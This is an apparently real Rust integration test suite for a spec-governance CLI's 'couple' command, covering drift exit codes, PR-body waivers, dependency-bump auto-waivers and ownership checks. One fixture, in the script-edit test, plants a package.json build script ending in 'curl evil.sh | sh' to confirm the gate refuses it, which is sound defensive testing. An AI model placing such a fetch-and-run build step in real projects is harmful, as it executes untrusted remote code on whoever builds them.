//! `spec-spine couple` end-to-end exit-code contract (spec 005):
//! drift → 1, cleared / waived → 0, stale index → 2. Uses `--paths-from` for the
//! deterministic core, plus one real `git diff` path.

use std::fs;
use std::path::Path;
use std::process::Command;

fn bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_spec-spine"))
}

fn code(out: &std::process::Output) -> i32 {
    out.status.code().unwrap_or(-1)
}

fn write(root: &Path, rel: &str, content: &str) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, content).unwrap();
}

/// A minimal governed repo: one crate owned (manifest + file unit) by spec 001-a.
fn setup(root: &Path) {
    write(root, "Cargo.toml", "[workspace]\nmembers = [\"crate-a\"]\n");
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n\
         [package.metadata.spec-spine]\nspec = \"001-a\"\n",
    );
    write(root, "crate-a/src/lib.rs", "pub fn a() {}\n");
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n---\n# 001-a\n## body\n",
    );
}

/// Compile + index so `couple`'s freshness guard passes against committed inputs.
fn refresh(root: &Path) {
    assert_eq!(
        code(
            &bin()
                .arg("--repo")
                .arg(root)
                .arg("compile")
                .output()
                .unwrap()
        ),
        0
    );
    assert_eq!(
        code(&bin().arg("--repo").arg(root).arg("index").output().unwrap()),
        0
    );
}

fn couple_paths(root: &Path, paths: &[&str], extra: &[&str]) -> std::process::Output {
    write(root, "changed.txt", &format!("{}\n", paths.join("\n")));
    let mut cmd = bin();
    cmd.arg("--repo")
        .arg(root)
        .arg("couple")
        .arg("--paths-from")
        .arg(root.join("changed.txt"));
    cmd.args(extra);
    cmd.output().unwrap()
}

#[test]
fn drift_then_cleared() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());

    // Changed an owned path, did not edit its spec → drift (exit 1).
    let drift = couple_paths(tmp.path(), &["crate-a/src/lib.rs"], &[]);
    assert_eq!(
        code(&drift),
        1,
        "{}",
        String::from_utf8_lossy(&drift.stderr)
    );

    // Same change + the owning spec.md → cleared (exit 0).
    let cleared = couple_paths(
        tmp.path(),
        &["crate-a/src/lib.rs", "specs/001-a/spec.md"],
        &[],
    );
    assert_eq!(code(&cleared), 0);
}

#[test]
fn waiver_clears_exit() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());
    write(
        tmp.path(),
        "pr-body.txt",
        "rolling forward\nSpec-Drift-Waiver: hotfix OPS-9\n",
    );
    let out = couple_paths(
        tmp.path(),
        &["crate-a/src/lib.rs"],
        &[
            "--pr-body",
            tmp.path().join("pr-body.txt").to_str().unwrap(),
        ],
    );
    assert_eq!(code(&out), 0, "{}", String::from_utf8_lossy(&out.stderr));
    assert!(String::from_utf8_lossy(&out.stdout).contains("waived"));
}

#[test]
fn stale_index_exits_2() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());
    // Mutate a hashed input (the spec) without re-indexing → stale.
    write(
        tmp.path(),
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: draft\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n---\n# 001-a\n## body\n",
    );
    let out = couple_paths(tmp.path(), &["crate-a/src/lib.rs"], &[]);
    assert_eq!(code(&out), 2, "stale index must exit 2");
}

#[test]
fn real_git_diff_detects_drift() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup(root);

    let git = |args: &[&str]| {
        let out = Command::new("git")
            .arg("-C")
            .arg(root)
            .args(args)
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@t")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@t")
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "git {args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    };

    git(&["init", "-q"]);
    refresh(root);
    git(&["add", "-A"]);
    git(&["commit", "-q", "-m", "base"]);

    // Change an owned file; refresh + commit at head.
    write(root, "crate-a/src/lib.rs", "pub fn a() {}\npub fn b() {}\n");
    refresh(root);
    git(&["add", "-A"]);
    git(&["commit", "-q", "-m", "head"]);

    let drift = bin()
        .arg("--repo")
        .arg(root)
        .args(["couple", "--base", "HEAD~1", "--head", "HEAD"])
        .output()
        .unwrap();
    assert_eq!(
        code(&drift),
        1,
        "git-diff drift: {}",
        String::from_utf8_lossy(&drift.stderr)
    );
}

// ===== spec 004 §3.5 + spec 005 §3.5: the dependabot-class path =====

/// A minimal governed repo with an npm package claimed by spec 001-a.
fn setup_npm(root: &Path, auto_waive: bool) {
    if auto_waive {
        write(
            root,
            "spec-spine.toml",
            "[coupling]\nauto_waive_dependency_only = true\n",
        );
    }
    write(
        root,
        "package.json",
        "{ \"name\": \"root\", \"workspaces\": [\"pkg-a\"] }\n",
    );
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.22.0\" } }\n",
    );
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"pkg-a\"\n---\n# 001-a\n## body\n",
    );
}

fn git_in(root: &Path, args: &[&str]) {
    let out = Command::new("git")
        .arg("-C")
        .arg(root)
        .args(args)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@t")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t")
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}

fn index_check(root: &Path) -> std::process::Output {
    bin()
        .arg("--repo")
        .arg(root)
        .args(["index", "check"])
        .output()
        .unwrap()
}

fn couple_git(root: &Path) -> std::process::Output {
    bin()
        .arg("--repo")
        .arg(root)
        .args(["couple", "--base", "HEAD~1", "--head", "HEAD"])
        .output()
        .unwrap()
}

#[test]
fn dependency_bump_stays_fresh_and_auto_waives() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, true);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Dependabot-style: bump a dependency version. No re-index, no spec edit,
    // no PR body.
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump"]);

    // (a) The committed index is still FRESH: dependency tables are not a
    // governed input (spec 004 §3.5 governance-projection hashing).
    let fresh = index_check(root);
    assert_eq!(
        code(&fresh),
        0,
        "index must stay fresh on a dep-only bump: {}",
        String::from_utf8_lossy(&fresh.stderr)
    );

    // (b) The coupling gate self-waives (spec 005 §3.5).
    let out = couple_git(root);
    assert_eq!(code(&out), 0, "{}", String::from_utf8_lossy(&out.stderr));
    assert!(
        String::from_utf8_lossy(&out.stdout).contains("auto-waived"),
        "stdout: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

#[test]
fn dependency_bump_without_optin_still_drifts() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, false);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump"]);

    let out = couple_git(root);
    assert_eq!(code(&out), 1, "auto-waiver is opt-in; default must drift");
}

#[test]
fn script_edit_refuses_the_auto_waiver() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, true);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);
    // A scripts edit hiding alongside a version bump: not dependency-only.
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc && curl evil.sh | sh\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump+script"]);

    let out = couple_git(root);
    assert_eq!(
        code(&out),
        1,
        "a non-dependency manifest edit must refuse the auto-waiver: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

#[test]
fn claimed_floor_path_refuses_the_auto_waiver() {
    // Spec 009 x 005 §3.5 interplay: a dependency-only bump PLUS an edit to a
    // floor path that a spec explicitly claims must NOT be mechanically
    // waived. With a claim-unaware pre-filter the workflow edit would hide
    // behind the floor, every remaining candidate would be a manifest, and
    // the dep-only waiver would excuse the workflow's C-001 -- fail-open.
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, true);
    write(root, ".github/workflows/release.yml", "name: release\n");
    write(
        root,
        "specs/002-wf/spec.md",
        "---\nid: \"002-wf\"\ntitle: \"W\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \".github/workflows/release.yml\"\n---\n# 002-wf\n## body\n",
    );
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // The PR: a dep bump AND a workflow edit, index refreshed (the workflow
    // is a hashed input), no spec edit, no PR body.
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    write(
        root,
        ".github/workflows/release.yml",
        "name: release\non: push\n",
    );
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump+workflow"]);

    let out = couple_git(root);
    assert_eq!(
        code(&out),
        1,
        "a claimed floor path must refuse the auto-waiver and drift: {}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("002-wf"),
        "the workflow's owner must be named: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}

// ===== spec 030: cargo + workflow dependabot-class paths =====

/// A minimal governed repo: one cargo crate discovered and floor-owned by spec
/// 001-a via its manifest metadata, with one external dependency to bump.
fn setup_cargo(root: &Path, auto_waive: bool) {
    if auto_waive {
        write(
            root,
            "spec-spine.toml",
            "[coupling]\nauto_waive_dependency_only = true\n",
        );
    }
    write(root, "Cargo.toml", "[workspace]\nmembers = [\"crate-a\"]\n");
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n\
         [package.metadata.spec-spine]\nspec = \"001-a\"\n\
         [dependencies]\nserde = \"1.0.0\"\n",
    );
    write(root, "crate-a/src/lib.rs", "pub fn a() {}\n");
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n---\n# 001-a\n## body\n",
    );
}

#[test]
fn cargo_dependency_bump_stays_fresh_and_auto_waives() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_cargo(root, true);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Dependabot-style cargo bump: a dependency version only. No re-index, no
    // spec edit, no PR body. The Cargo.toml is floor-owned by 001-a.
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n\
         [package.metadata.spec-spine]\nspec = \"001-a\"\n\
         [dependencies]\nserde = \"1.0.5\"\n",
    );
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump"]);

    // (a) Still FRESH: the cargo governance projection (spec 004 §3.5, spec 030)
    // strips dependency tables, so a version bump is not a hashed input.
    let fresh = index_check(root);
    assert_eq!(
        code(&fresh),
        0,
        "index must stay fresh on a cargo dep-only bump: {}",
        String::from_utf8_lossy(&fresh.stderr)
    );

    // (b) The coupling gate self-waives (spec 005 §3.5, extended by spec 030).
    let out = couple_git(root);
    assert_eq!(code(&out), 0, "{}", String::from_utf8_lossy(&out.stderr));
    assert!(
        String::from_utf8_lossy(&out.stdout).contains("auto-waived"),
        "stdout: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

#[test]
fn cargo_feature_edit_without_bump_still_drifts() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_cargo(root, true);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // A feature-set change hiding as a dependency edit: not dependency-only.
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n\
         [package.metadata.spec-spine]\nspec = \"001-a\"\n\
         [dependencies]\nserde = { version = \"1.0.0\", features = [\"derive\"] }\n",
    );
    refresh(root); // a shape flip may alter nothing the indexer reads; refresh anyway
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "features"]);

    let out = couple_git(root);
    assert_eq!(
        code(&out),
        1,
        "a features edit must refuse the cargo auto-waiver: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

#[test]
fn workflow_uses_bump_auto_waives() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    // Reuse the cargo repo for a valid, indexable tree, then add a workflow
    // file explicitly claimed by a spec (so it overrides the .github/ floor).
    setup_cargo(root, true);
    write(
        root,
        ".github/workflows/ci.yml",
        "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \
         steps:\n      - uses: actions/checkout@v4\n      - run: cargo test\n",
    );
    write(
        root,
        "specs/002-ci/spec.md",
        "---\nid: \"002-ci\"\ntitle: \"CI\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \".github/workflows/ci.yml\"\n---\n# 002-ci\n## body\n",
    );
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Dependabot github-actions bump: the action ref only, no spec edit.
    write(
        root,
        ".github/workflows/ci.yml",
        "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \
         steps:\n      - uses: actions/checkout@v5\n      - run: cargo test\n",
    );

    // Spec 073 3.4: the bump leaves the index FRESH, with no re-index in
    // between. `.github/workflows/**/*` is a hashed input (spec 069 fixed the
    // default that had made it one in name only), so before 073 this same bump
    // moved the global-inputs scalar and staled every shard in the repository.
    // That is the wall a Dependabot PR met: the bot has no toolchain to
    // re-index, no write path to commit shards, and no way to put a waiver in
    // a body it does not author. Spec 069 3.6 required this test to assert the
    // stale-then-reindex sequence; 073 amends that, and the projection is what
    // makes the assertion below true.
    let fresh = index_check(root);
    assert_eq!(
        code(&fresh),
        0,
        "a `uses:` bump must leave the index fresh: {}",
        String::from_utf8_lossy(&fresh.stderr)
    );

    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump-action"]);

    let out = couple_git(root);
    assert_eq!(code(&out), 0, "{}", String::from_utf8_lossy(&out.stderr));
    assert!(
        String::from_utf8_lossy(&out.stdout).contains("auto-waived"),
        "stdout: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

/// Spec 073 3.4's companion: the other direction, on the same fixture.
///
/// Without it the suite proves only that the projection is permissive, not
/// that it is correct, which is the shape of assertion spec 069 3.6 was
/// written to end. A `run:` edit is a governed change to a claimed file: it
/// stales the ledger and it refuses the waiver.
#[test]
fn workflow_run_edit_stales_the_index_and_refuses_the_waiver() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_cargo(root, true);
    write(
        root,
        ".github/workflows/ci.yml",
        "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \
         steps:\n      - uses: actions/checkout@v4\n      - run: cargo test\n",
    );
    write(
        root,
        "specs/002-ci/spec.md",
        "---\nid: \"002-ci\"\ntitle: \"CI\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \".github/workflows/ci.yml\"\n---\n# 002-ci\n## body\n",
    );
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Not a version bump: the step now runs something else.
    write(
        root,
        ".github/workflows/ci.yml",
        "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \
         steps:\n      - uses: actions/checkout@v4\n      - run: cargo bench\n",
    );

    let stale = index_check(root);
    assert_eq!(
        code(&stale),
        2,
        "a `run:` edit must stale the index: {}",
        String::from_utf8_lossy(&stale.stderr)
    );

    // Re-index so the refusal below is the coupling gate's, not staleness.
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "run-edit"]);

    let out = couple_git(root);
    assert_eq!(
        code(&out),
        1,
        "a `run:` edit must refuse the auto-waiver: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

// ===== spec 032: the ownership ratchet, end to end =====

/// A crate with no manifest floor: `src/lib.rs` is claimed by a file unit,
/// anything else under it is unowned. `require_ownership` is on.
fn setup_ratchet(root: &Path) {
    write(root, "Cargo.toml", "[workspace]\nmembers = [\"crate-a\"]\n");
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n",
    );
    write(root, "crate-a/src/lib.rs", "pub fn a() {}\n");
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n---\n# 001-a\n## body\n",
    );
    write(
        root,
        "spec-spine.toml",
        "[coupling]\nrequire_ownership = true\n",
    );
}

#[test]
fn ratchet_refuses_new_unowned_source_and_allows_its_deletion() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_ratchet(root);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Add an unowned source file: C-002, exit 1, named as such.
    write(root, "crate-a/src/extra.rs", "pub fn extra() {}\n");
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "add unowned"]);
    let refused = couple_git(root);
    let stderr = String::from_utf8_lossy(&refused.stderr);
    assert_eq!(code(&refused), 1, "{stderr}");
    assert!(stderr.contains("1 unclaimed (C-002"), "{stderr}");
    assert!(
        stderr.contains("'crate-a/src/extra.rs' is not claimed by any spec"),
        "{stderr}"
    );

    // A PR-body waiver clears it like any violation.
    write(
        root,
        "pr-body.txt",
        "Spec-Drift-Waiver: vendored drop, spec to follow\n",
    );
    let waived = bin()
        .arg("--repo")
        .arg(root)
        .args(["couple", "--base", "HEAD~1", "--head", "HEAD", "--pr-body"])
        .arg(root.join("pr-body.txt"))
        .output()
        .unwrap();
    assert_eq!(code(&waived), 0);
    assert!(String::from_utf8_lossy(&waived.stdout).contains("waived"));

    // Deleting the unowned file is how coverage goes up: no C-002, exit 0.
    fs::remove_file(root.join("crate-a/src/extra.rs")).unwrap();
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "remove unowned"]);
    let allowed = couple_git(root);
    assert_eq!(
        code(&allowed),
        0,
        "{}",
        String::from_utf8_lossy(&allowed.stderr)
    );

    // And the whole-tree assertion agrees: fully specified again.
    let full = bin()
        .arg("--repo")
        .arg(root)
        .args(["index", "coverage", "--fail-on-untraced"])
        .output()
        .unwrap();
    assert_eq!(code(&full), 0, "{}", String::from_utf8_lossy(&full.stderr));
}

// ── spec 052: the refusal names the crossing ──────────────────────────────

/// [`setup`] plus a second spec that owns a *different* file, so a diff can
/// edit exactly one `spec.md` that owns none of the violating paths: the
/// crossing case §3.3 is about.
fn setup_two_specs(root: &Path) {
    setup(root);
    write(root, "crate-a/src/other.rs", "pub fn other() {}\n");
    write(
        root,
        "specs/002-b/spec.md",
        "---\nid: \"002-b\"\ntitle: \"B\"\nstatus: approved\ncreated: \"2026-09-07\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/other.rs\"\n---\n# 002-b\n## body\n",
    );
}

/// §3.2: a `C-001` report names three doors, and door two is the one that was
/// missing. The corpus's answer to "I legitimately touched somebody else's
/// unit" has always been an `extends` edge in the author's own spec; the gate
/// never said so, and claude-observatory spent four sessions proving the wall.
#[test]
fn footer_names_three_doors_including_extends() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());

    let out = couple_paths(tmp.path(), &["crate-a/src/lib.rs"], &[]);
    assert_eq!(code(&out), 1);
    let e = String::from_utf8_lossy(&out.stderr);

    assert!(e.contains("  1. Edit the owning spec's spec.md"), "{e}");
    assert!(e.contains("  2. Declare an `extends` edge"), "{e}");
    assert!(e.contains("  3. Add a 'Spec-Drift-Waiver:"), "{e}");
    // Door two's two load-bearing facts, without which an author still reads
    // the edge as a change to somebody else's spec.
    assert!(e.contains("amends nobody and\n     needs no waiver"), "{e}");
    // And the waiver is named as the human instrument it is, not as a flag.
    assert!(e.contains("needs explicit human approval"), "{e}");
    // Pasteable YAML, not prose: the syntax is the part adopters got wrong.
    assert!(e.contains("extends:"), "{e}");
    assert!(e.contains("nature: additive"), "{e}");
}

/// §3.3: exactly one edited `spec.md` ⇒ the footer names it and emits the
/// concrete block, with the violating path and its owner filled in.
#[test]
fn one_edited_spec_gets_a_concrete_extends_block() {
    let tmp = tempfile::tempdir().unwrap();
    setup_two_specs(tmp.path());
    refresh(tmp.path());

    // 002-b is edited; it owns `other.rs`, not `lib.rs`, so `lib.rs` drifts.
    let out = couple_paths(
        tmp.path(),
        &["crate-a/src/lib.rs", "specs/002-b/spec.md"],
        &[],
    );
    assert_eq!(code(&out), 1, "{}", String::from_utf8_lossy(&out.stderr));
    let e = String::from_utf8_lossy(&out.stderr);

    assert!(
        e.contains("spec 002-b is the only spec.md edited in this diff"),
        "{e}"
    );
    assert!(e.contains("specs/002-b/spec.md"), "{e}");
    assert!(
        e.contains("- { spec: \"001-a\", unit: \"crate-a/src/lib.rs\", nature: additive }"),
        "the block is filled in, not a template: {e}"
    );
    // §3.3: a suggestion, never an instruction, and never a claim that
    // `additive` is a judgement the gate reached about the author's intent.
    assert!(e.contains("A suggestion, not an instruction"), "{e}");
    assert!(e.contains("revert the touch and declare nothing"), "{e}");
}

/// §3.3: zero or two-or-more edited `spec.md` paths fall back to the generic
/// form. Two edited specs is a legitimate shape (an amendment pair) and the
/// gate has no basis for guessing which one should declare the edge.
#[test]
fn two_edited_specs_fall_back_to_the_generic_form() {
    let tmp = tempfile::tempdir().unwrap();
    setup_two_specs(tmp.path());
    refresh(tmp.path());

    // A third spec that owns nothing here, so neither edited spec clears
    // `lib.rs` and two spec.md paths are in the diff.
    write(
        tmp.path(),
        "specs/003-c/spec.md",
        "---\nid: \"003-c\"\ntitle: \"C\"\nstatus: approved\ncreated: \"2026-09-07\"\n\
         summary: \"s\"\nreferences:\n  - { unit: { kind: file, path: \"README.md\" }, role: context }\n\
         ---\n# 003-c\n## body\n",
    );
    write(tmp.path(), "README.md", "# r\n");
    refresh(tmp.path());

    let out = couple_paths(
        tmp.path(),
        &[
            "crate-a/src/lib.rs",
            "specs/002-b/spec.md",
            "specs/003-c/spec.md",
        ],
        &[],
    );
    assert_eq!(code(&out), 1, "{}", String::from_utf8_lossy(&out.stderr));
    let e = String::from_utf8_lossy(&out.stderr);

    assert!(!e.contains("is the only spec.md edited"), "{e}");
    assert!(e.contains("<owning-spec-id>"), "generic shape: {e}");
}

/// §3.2: a report carrying only `C-002` renders the footer it rendered before
/// this spec. Claiming an unowned path is a different act from crossing into
/// somebody else's territory, and the three doors do not describe it.
#[test]
fn c002_only_footer_is_unchanged() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_ratchet(root);
    refresh(root);

    write(root, "crate-a/src/extra.rs", "pub fn extra() {}\n");
    refresh(root);
    let out = couple_paths(root, &["crate-a/src/extra.rs"], &[]);
    assert_eq!(code(&out), 1, "{}", String::from_utf8_lossy(&out.stderr));
    let e = String::from_utf8_lossy(&out.stderr);

    assert!(
        e.contains(
            "Resolve by editing an owning spec's spec.md (C-001), claiming the path \
             in a spec's owning edge (C-002), or add a 'Spec-Drift-Waiver:' line to \
             the PR body."
        ),
        "{e}"
    );
    assert!(!e.contains("  1. Edit the owning spec"), "{e}");
}

/// §3.5: the envelope carries `owners` as data and no guidance prose. Guidance
/// in the envelope would be a third representation of the same list, stale
/// against the prose and useless to the machine that already has the list.
#[test]
fn json_envelope_carries_owners_not_prose() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());

    let out = couple_paths(tmp.path(), &["crate-a/src/lib.rs"], &["--json"]);
    assert_eq!(code(&out), 1);
    let v: serde_json::Value =
        serde_json::from_slice(&out.stdout).expect("verdict envelope is JSON");
    let violation = &v["report"]["violations"][0];
    assert_eq!(violation["code"], "C-001");
    assert_eq!(violation["owners"][0], "001-a");

    let text = String::from_utf8_lossy(&out.stdout);
    assert!(!text.contains("Declare an `extends` edge"), "{text}");
    // §3.4: a payload addition does not move the envelope's version (spec 050
    // §3.6). Asserted against the constant rather than a literal, because an
    // additive verb elsewhere legitimately moves it (spec 056 did) and that is
    // not a payload addition.
    assert_eq!(v["schemaVersion"], spec_spine_types::VERDICT_SCHEMA_VERSION);
}
